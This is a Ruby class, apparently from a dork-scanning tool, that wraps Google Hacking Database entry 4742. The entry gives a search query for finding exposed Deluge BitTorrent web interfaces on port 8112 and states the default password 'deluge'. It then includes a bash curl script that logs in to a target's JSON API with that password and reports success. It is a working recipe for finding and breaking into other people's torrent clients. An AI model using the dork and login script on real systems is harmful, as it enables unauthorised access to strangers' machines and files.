module Dorks
   class Dork4742 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 4742",
            ghdb_url: "https://www.exploit-db.com/ghdb/4742",
            severity: "5",
            category: "files_containing_juicy_info",
            publish_date: "2018-04-03",
            author: "Pancaker",
            dork: <<~EDORK,
Deluge - Web UI (BitTorrent Client - Download/Upload/Seed/Control/File Explorer) v3
EDORK
            description: <<~EDESC
GoogleDork v3 ~ intitle:"Deluge: Web UI" inurl:":8112"
Default password: `deluge` ~ https://dev.deluge-torrent.org/wiki/UserGuide/ThinClient#ClientSetup1
Default port: `8112` ~ https://dev.deluge-torrent.org/wiki/UserGuide/ThinClient#ClientSetup1
- - -
## Bash
```
url="http://target.com:8112/json"
pass="deluge"
req=$( curl -s "${url}" \\
-H 'Content-Type: application/json' \\
--data-binary '{"method":"auth.login","params":["'${pass}'"],"id":1}' \\
--compressed )
echo ${req} | grep -q '"result": true' \\
&& echo 'w000h000!' \\
|| echo 'b00'
```
- - -
## Other Work
- ruTorrent ~ https://www.exploit-db.com/ghdb/4652/
- Deluge v1+v2 (+autopwner) ~ https://www.exploit-db.com/ghdb/4741/
EDESC
         })

      end
   end
end
